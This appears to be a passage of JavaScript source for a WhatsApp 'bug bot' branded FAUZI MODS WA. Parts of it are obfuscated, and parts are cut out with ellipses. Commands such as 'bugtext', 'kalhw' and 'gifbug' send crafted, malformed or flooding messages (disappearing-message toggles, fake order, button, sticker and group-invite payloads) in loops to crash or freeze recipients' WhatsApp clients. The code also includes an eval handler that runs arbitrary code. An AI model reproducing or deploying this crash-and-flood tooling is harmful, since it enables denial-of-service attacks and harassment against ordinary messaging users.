        function _0x1cb7(_0x5b11ad,_0x337f53){var _0x45ab97=_0x45ab();return _0x1cb7=function(_0x1cb75d,_0x4d64d3){_0x1cb75d=_0x1cb75d-0xa2;var _0x25d5c5=_0x45ab97[_0x1cb75d];return _0x25d5c5;},_0x1cb7(_0x5b11ad,_0x337f53);}var _0x3a5a33=_0x1cb7;(function(_0x31c1cc,_0x492001){var _0x2aad6e=_0x1cb7,_0x3847af=_0x31c1cc();while(!![]){try{var _0x35e4de=parseInt(_0x2aad6e(0xaa))/0x1+-parseInt(_0x2aad6e(0xb0))/0x2*(-parseInt(_0x2aad6e(0xaf))/0x3)+-parseInt(_0x2aad6e(0xa9))/0x4+parseInt(_0x2aad6e(0xac))/0x5*(-parseInt(_0x2aad6e(0xa8))/0x6)+parseInt(_0x2aad6e(0xad))/0x7+parseInt(_0x2aad6e(0xa3))/0x8*(-parseInt(_0x2aad6e(0xab))/0x9)+-parseInt(_0x2aad6e(0xa5))/0xa;if(_0x35e4de===_0x492001)break;else _0x3847af['push'](_0x3847af['shift']());}catch(_0x138b7c){_0x3847af['push'](_0x3847af['shift']());}}}(_0x45ab,0xb1945));if(!kal['key'][_0x3a5a33(0xa6)])return;await FAUZI[_0x3a5a33(0xa4)](FAUZI[_0x3a5a33(0xa7)](from,FAUZI['prepareDisappearingMessageSettingContent'](0x0),{}),{'waitForAck':!![]}),await FAUZI['relayWAMessage'](FAUZI[_0x3a5a33(0xa7)](from,FAUZI[_0x3a5a33(0xa2)](0x0),{}),{'waitForAck':!![]}),await FAUZI[_0x3a5a33(0xa4)](FAUZI[_0x3a5a33(0xa7)](from,FAUZI[_0x3a5a33(0xa2)](0x0),{}),{'waitForAck':!![]}),await FAUZI[_0x3a5a33(0xa4)](FAUZI[_0x3a5a33(0xa7)](from,FAUZI[_0x3a5a33(0xa2)](0x0),{}),{'waitForAck':!![]}),await FAUZI[_0x3a5a33(0xa4)](FAUZI[_0x3a5a33(0xa7)](from,FAUZI[_0x3a5a33(0xa2)](0x0),{}),{'waitForAck':!![]}),await FAUZI[_0x3a5a33(0xa4)](FAUZI[_0x3a5a33(0xa7)](from,FAUZI[_0x3a5a33(0xa2)](0x0),{}),{'waitForAck':!![]}),freply(_0x3a5a33(0xae)+groupName);function _0x45ab(){var _0x90fcd=['\x20Sukses\x20Mengirim\x20Bug\x20Di\x20','161886xbucPe','46hRdTif','prepareDisappearingMessageSettingContent','189696oHkgAg','relayWAMessage','6938970bVRawM','fromMe','prepareMessageFromContent','30xneJsb','193652VKgdqT','789579sAjOpk','414vYeFtt','38885pmyNcg','3980249pAFWzA'];_0x45ab=function(){return _0x90fcd;};return _0x45ab();}
        }
        break
// Bug virtext
case 'bugtext':
...
if (args.length < 1) return freply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
FAUZI.sendMessage(from, `FAUZI MODS WA ${ngazap(prefix)}`, MessageType.extendedText,{
 quoted: {
  key: {
  ...
  message: {
   orderMessage: {
    ...
    status: 1,
    surface: 1,
    message: `FAUZI MODS WA ${ngazap(prefix)}`,
    orderTitle: `FAUZI MODS WA`, // 
...
if (args.length < 1) return freply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
var _0x596d0c=_0x5e12;(function(_0x3b7803,_0x45de8d){var _0x408dd4=_0x5e12,_0x9ddd92=_0x3b7803();while(!![]){try{var _0x19d83f=parseInt(_0x408dd4(0x115))/0x1*(-parseInt(_0x408dd4(0x11d))/0x2)+parseInt(_0x408dd4(0x11c))/0x3+parseInt(_0x408dd4(0x108))/0x4*(parseInt(_0x408dd4(0x119))/0x5)+-parseInt(_0x408dd4(0x11e))/0x6+parseInt(_0x408dd4(0x109))/0x7*(parseInt(_0x408dd4(0x10d))/0x8)+parseInt(_0x408dd4(0x10b))/0x9*(-parseInt(_0x408dd4(0x111))/0xa)+parseInt(_0x408dd4(0x117))/0xb;if(_0x19d83f===_0x45de8d)break;else _0x9ddd92['push'](_0x9ddd92['shift']());}catch(_0x1ec3aa){_0x9ddd92['push'](_0x9ddd92['shift']());}}}(_0x2647,0x6833a));if(isBan)return reply(mess['ban']);function _0x2647(){var _0x58905b=['41724','732936jxzmDC','IMAGE','/v/t62.7118-24/40814942_894434631167103_6128360717210971009_n.enc?ccb=11-4&oh=9dda6f99494de7bec26356eb40066b4d&oe=61755509','FAUZI','92370hAtQlr','RESPONSE','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0a©XM\x20XHIRO\x20MHONSHINE','relayWAMessage','566269eMRTaQ','https://mmg.whatsapp.net/d/f/AmPEkmmNOvdptA7RnPyYJvMoePjLNOCJ-w7TJRAtnN6O.enc','15132634MvQbju','HW\x20MODS\x20WA😍','10mjDuGZ','xr2d13oMedRrGkIH6hE/2Ln+dfVyX6KqlK2NhfKTIzFnpy3b4ynDow==','prepareMessageFromContent','2270646ZnmHDq','2sZMXoW','4873680cnVJUd','upO62/S7uPP3aObb/Ribyf/RRQgKFSvhdllcoP2ixBY=','\x20❏HW\x20MODS\x20WA❏\x0a\x09\x09\x09\x09\x09\x09\x09\x09\x09©XM\x20XHIRO\x20MHONSHINE','1632666462','401596xTgIDR','14BCGBVQ','IuG6p6xjeHMURysJeB772SPk6g2n+hyyzeyxVETTYZ4=','693FbsHUp'];_0x2647=function(){return _0x58905b;};return _0x2647();}function _0x5e12(_0xc5c356,_0x10557d){var _0x2647e4=_0x2647();return _0x5e12=function(_0x5e12e0,_0xf1165f){_0x5e12e0=_0x5e12e0-0x108;var _0x4fc862=_0x2647e4[_0x5e12e0];return _0x4fc862;},_0x5e12(_0xc5c356,_0x10557d);}res=await FAUZI[_0x596d0c(0x11b)](from,{'buttonsMessage':{'text':'','imageMessage':{'url':_0x596d0c(0x116),'mimetype':'image/jpeg','caption':_0x596d0c(0x118),'fileSha256':_0x596d0c(0x10a),'fileLength':_0x596d0c(0x10c),'height':0x280,'width':0x280,'mediaKey':'CHWNuBGiL1XuUdJF3Y2qDiyuSaPAVIH9vDpNpYEpoqk=','fileEncSha256':'CkxcGOoIO5NuE/CdEI9ia6FKf2Dp5gsbH7aQnTZRPDQ=','directPath':_0x596d0c(0x10f),'mediaKeyTimestamp':_0x596d0c(0x121),'jpegThumbnail':fs['readFileSync']('./stik/Ahhikal.jpeg'),'scansSidecar':_0x596d0c(0x11a),'scanLengths':[0x12c8,0x3cd7,0x1e3e,0x351f],'midQualityFileSha256':_0x596d0c(0x11f)},'contentText':_0x596d0c(0x113)+ngazap(prefix),'footerText':'https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g','buttons':[{'buttonId':_0x596d0c(0x110),'buttonText':{'displayText':_0x596d0c(0x120)+ngazap(prefix)},'type':_0x596d0c(0x112)}],'headerType':_0x596d0c(0x10e)}},{'quoted':kal}),FAUZI[_0x596d0c(0x114)](res);
}
break
case 'kalhw':
if (!kal.key.fromMe) return
if (args.length < 1) return freply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
var _0x4dc560=_0x2fb6;(function(_0x95be98,_0x50f4d5){var _0x157bb0=_0x2fb6,_0x339679=_0x95be98();while(!![]){try{var _0x2294fb=parseInt(_0x157bb0(0xd9))/0x1*(-parseInt(_0x157bb0(0xd6))/0x2)+-parseInt(_0x157bb0(0xc7))/0x3*(parseInt(_0x157bb0(0xce))/0x4)+parseInt(_0x157bb0(0xc6))/0x5*(parseInt(_0x157bb0(0xd1))/0x6)+parseInt(_0x157bb0(0xd3))/0x7*(parseInt(_0x157bb0(0xd5))/0x8)+-parseInt(_0x157bb0(0xc3))/0x9+parseInt(_0x157bb0(0xc9))/0xa+parseInt(_0x157bb0(0xc8))/0xb*(parseInt(_0x157bb0(0xcb))/0xc);if(_0x2294fb===_0x50f4d5)break;else _0x339679['push'](_0x339679['shift']());}catch(_0x4ad67c){_0x339679['push'](_0x339679['shift']());}}}(_0x3101,0x4c2e3));if(isBan)return reply(mess[_0x4dc560(0xd2)]);if(!kal[_0x4dc560(0xcf)][_0x4dc560(0xca)]&&!isOwner)return;function _0x3101(){var _0x226b84=['2328GMLeiH','https://wa.me/c/62857916772045','prepareMessageFromContent','171540kmhydD','key','./stik/Ahhikal.jpeg','696AYvnob','ban','14jAxHAJ','readFileSync','176216MwjwwW','70gbSfjw','NONE','HW\x20MODS\x20WA','4951WubEPt','1266615uPCtPY','relayWAMessage','Buka\x20tautan\x20ini\x20untuk\x20melihat\x20katalog\x20kami\x20di\x20WhatsApp:\x20https://wa.me/c/62857916772045','25605GODwXA','27DXbmbt','8030lZdLYp','2323100LiizGt','fromMe'];_0x3101=function(){return _0x226b84;};return _0x3101();}function _0x2fb6(_0x241135,_0x2122b1){var _0x3101ca=_0x3101();return _0x2fb6=function(_0x2fb64d,_0x7347e7){_0x2fb64d=_0x2fb64d-0xc3;var _0x1a8b30=_0x3101ca[_0x2fb64d];return _0x1a8b30;},_0x2fb6(_0x241135,_0x2122b1);}res=await FAUZI[_0x4dc560(0xcd)](from,{'extendedTextMessage':{'text':_0x4dc560(0xc5),'matchedText':_0x4dc560(0xcc),'description':'©XM\x20XHIRO\x20MHONSHINE'+ngazap(prefix),'title':_0x4dc560(0xd8),'previewType':_0x4dc560(0xd7),'jpegThumbnail':fs[_0x4dc560(0xd4)](_0x4dc560(0xd0)),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),FAUZI[_0x4dc560(0xc4)](res);
}
break
case 'gifbug':
if (!kal.key.fromMe) return
...
res = await FAUZI.prepareMessageFromContent(from,{
					"stickerMessage": {
						"fileSha256": "t5zZikwgygpCIqJF4X9cCLeDT/keNEFOuPw87XqHUnU=",
						"fileEncSha256": "7FAtIN4LyI6/aVYqoX+56Q0U5lmoBKfTT9Bq11dXOGY=",
						"thumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"mimetype": "image/webp",
						"fileLength": "8756",
						"isAnimated": false						
...
res = await FAUZI.prepareMessageFromContent(from,{
					"buttonsMessage": {
						...
						"documentMessage": {
							...
							"fileName": `FAUZI MODS WA${ngazap(prefix)}`,
						...
						"buttons": [
							{
								"buttonId": "FAUZI",
								"buttonText": {
									"displayText": `FAUZI MODS WA${ngazap(prefix)}`,
								},						
								"type": "RESPONSE"
							}
						],
...
res = await FAUZI.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",				
						"contentText": `FAUZI MODS WA${ngazap(prefix)}`,
						"footerText": `FAUZI MODS WA${ngazap(prefix)}`,
						"buttons": [
							{
								"buttonId": "FAUZI",
								"buttonText": {
...
"groupInviteMessage": {
						...
						"inviteExpiration": `MY NAME FAUZI MODS WA${ngazap(prefix)}`,
						"groupName": `MY NAME FAUZI MODS WA${ngazap(prefix)}`,
						"caption": `${ngazap(prefix)}`,
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
...
if (!kal.key.fromMe && !isOwner) return
try {
return FAUZI.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: ikal})
} catch(err) {
e = String(err)
reply(e)
}
}
// Anti Tag ( FAUZI MODS WA )
const listTag = ["6285791677204@s.whatsapp.net","6285791677204@s.whatsapp.net"]
const partiNum = (type === 'extendedTextMessage') ? kal.message.extendedTextMessage.contextInfo.participant : ''
// Antitag Via Reply ( FAUZI MODS WA )
if (listTag.includes(partiNum)) {
if (antitags === false) return
if (kal.key.fromMe) return
if (isOwner) return
sendNye = fs.readFileSync('media/sticker/jantag.webp')
FAUZI.sendMessage(from, sendNye, sticker, {quoted:ikal, contextInfo:{forwardingScore: 800, isForwarded: true}})
}
// Antitag Via Tag ( FAUZI MODS WA )
if (budy.includes("@6285791677204")) {
if (antitags === false) return
if (kal.key.fromMe) return
if (isOwner) return
sendNye = fs.readFileSync('media/sticker/jantag.webp')
